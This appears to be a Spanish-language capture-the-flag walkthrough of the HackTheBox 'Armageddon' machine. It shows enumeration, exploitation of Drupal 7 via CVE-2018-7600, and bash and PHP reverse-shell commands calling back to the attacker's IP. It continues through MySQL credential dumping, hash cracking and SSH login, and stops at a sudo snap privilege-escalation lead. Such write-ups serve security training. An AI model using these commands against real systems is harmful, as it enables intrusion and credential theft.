# ARMAGEDDON MACHINE

![[Pasted image 20210519224421.png]]

## ENUMERACION

```
nmap -p- --open -T5 -v -n 10.10.10.233 -oG allPorts
```

![[Pasted image 20210519224541.png]]

vemos 2 puertos abiertos, vamos a enumerar sus servicios:

```
nmap -p22,80 -sC -sV -oN targeted
```

![[Pasted image 20210519224859.png]]

El puerto 22 es SSH quiza para conectarnos posteriormente.

El puerto 80 es una pagina web, un drupal 7 en un servidor apache y con PHP 5.4.16. Ademas de un robot.

Veamos que tiene la pagina:

![[Pasted image 20210519225107.png]]

veamos si el robots.txt nosd dice algo:

![[Pasted image 20210519225208.png]]

vemos algunos directorios pero nada interesante.

Veamos con wfuzz si hay algun otro directorio que no nos muestra el robots.txt:

```
wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.10.233/FUZZ
```

![[Pasted image 20210519225523.png]]

Vemos el directorio sites, vamos a ver que hay ahi:

![[Pasted image 20210519225602.png]]

si vamos a default vemos lo siguiente:

![[Pasted image 20210519225646.png]]

Vemos archivos de configuracion pero con extension en .php y no podemos ver el contenido a nivel web porque nos lo interpreta el .php


## EXPLOTACION

Vamos a buscar en searchsploit si esa version de drupal tiene alguna vulnerabilidad:

```
searchsploit drupal 7
```

![[Pasted image 20210519230219.png]]

Entre muchas cosas vi un RCE en python, lo copiamos en nuestro directorio:

```
searchsploit -m php/webapps/44448.py
```

Y al ver su contenido vemos que tiene un CVE asociado:

![[Pasted image 20210519230345.png]]

Si buscamos en google ese CVE y le agregamos github vemos un repositorio interesante:

[https://github.com/pimps/CVE-2018-7600](https://github.com/pimps/CVE-2018-7600)

Nos descargamos el drupa7-CVE-2018-7600.py:

```
wget https://raw.githubusercontent.com/pimps/CVE-2018-7600/master/drupa7-CVE-2018-7600.py
```

analizamos el codigo y vemos los parametros que tiene:

![[Pasted image 20210519230741.png]]

Vemos que con la opcion **-c** agregamos un comando a ejecutar y por defecto realiza un **id**. ademas se le indica un target que es la pagina con drupal.

Como el script esta en python 3 ("#!/usr/bin/env python3") lo vamos a ejecutar y ver si nos devuelve el comando id:

```
python3 drupa7-CVE-2018-7600.py http://10.10.10.233/
```

![[Pasted image 20210519231039.png]]

vemos que si nos ejecuta comandos remotamente, entonces vamos a entablarnos una reverse shell:

```
python3 drupa7-CVE-2018-7600.py http://10.10.10.233/ -c '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.235/443 0>&1"'

donde 10.10.14.235 es nuestra IP
donde 443 es el puerto al que estamos en escucha con netcat
```

![[Pasted image 20210519231517.png]]

Debe estar con comillas simples la opcion -c para que funcione, en todo caso siempre se debe probar con comillas dobles o simples.

Otra forma que puedes mandar una shell puede ser con php ya que el servidor tiene PHP 5.4.16.

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

o tambien mandandolo en base64 codificado, lo decodificamos y lo pipeamos a la bash:

```
# encoding

echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.235/443 0>&1"' | base64

# sending

python3 drupa7-CVE-2018-7600.py http://10.10.10.233/ -c 'echo -n "base64_encoded" | base64 -d | sh'
```

El -n en el echo es para no mostrar salida al imprimir:

![[Pasted image 20210519232117.png]]

vemos el contenido en donde nos encontramos y vemos una carpeta sites (que es donde estaban los archivos de configuracion):

![[Pasted image 20210519232333.png]]

vamos a sites/defaults y vemos el contenido del archivo settigns.php:

```
cd sites/default

cat settings.php
```

vamos a ver unas credenciales de mysql:

![[Pasted image 20210519232545.png]]

vamos a ver si nos podemos conectar:

```
mysql -u drupaluser -D drupal -pCQHEy@9M*m23gBVj
```

![[Pasted image 20210519232728.png]]

No nos muestra nada veamos si podemos ejecutar un **show tables;**

![[Pasted image 20210519232825.png]]

si despues de poner la sentencia ponemos un quit si nos muestra el comando, hay un parametro que es el -e que nos ejecuta un comando y al final quit en uno solo:

![[Pasted image 20210519233026.png]]

ahi vamos a ejecutar las sentencias:

```
mysql -u drupaluser -D drupal -pCQHEy@9M*m23gBVj -e 'show tables;'
```

de todas las tablas que se lista vemos una que es users, vamos a realizar que campos tiene:

```
mysql -u drupaluser -D drupal -pCQHEy@9M*m23gBVj -e 'show columns from users;'
```

![[Pasted image 20210519233742.png]]

nos interesa name y pass:

```
mysql -u drupaluser -D drupal -pCQHEy@9M*m23gBVj -e 'select name,pass from users;'
```

![[Pasted image 20210519233859.png]]

tenemos unas credenciales:

* usuario: brucetherealadmin
* hash: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt

podemos comprobar que es un usuario del sistema con:

```
cat /etc/passwd
```

![[Pasted image 20210519234100.png]]


vamos a cracker el hash con hashcat:

Existe un modulo de hashcat para contraseñas de drupal 7 que es el 7900:

[https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

![[Pasted image 20210519234241.png]]

Y se ve que tiene la misma estructura del hash que tenemos $S$.

Usamos el diccionario rockyou para realizar el cracking:

```
hashcat -a 0 -m 7900 hash /usr/share/wordlists/rockyou.txt

donde hash es un archivo que creamos donde colocamos solo el hash
```

Despues de un rato vemos que logramos obtener la contraseña con --show:

![[Pasted image 20210519234649.png]]

Recordando que el puerto 22 esta abierto vamos a conectarnos:

* usuario: brucetherealadmin
* contraseña: booboo

```
ssh brucetherealadmin@10.10.10.233
booboo
```

![[Pasted image 20210519234835.png]]

Estamos dentro y podemos ver la flag


## ESCALA DE PRIVILEGIOS	

veamos que tenemos con sudo -l:

```
sudo -l
```

![[Pasted image 20210519234925.png]]

Vemos que podemos ejecutar **/usr/bin/snap install** como sudo.

